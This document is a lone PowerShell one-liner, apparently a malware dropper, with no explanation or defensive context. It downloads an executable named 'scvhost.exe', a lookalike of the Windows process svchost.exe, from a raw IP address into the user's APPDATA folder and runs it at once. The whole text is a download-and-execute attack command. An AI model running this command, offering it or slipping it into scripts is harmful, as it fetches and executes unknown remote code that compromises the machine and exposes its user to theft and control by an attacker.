
(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',"$env:APPDATA\scvhost.exe");Start-Process ("$env:APPDATA\scvhost.exe")

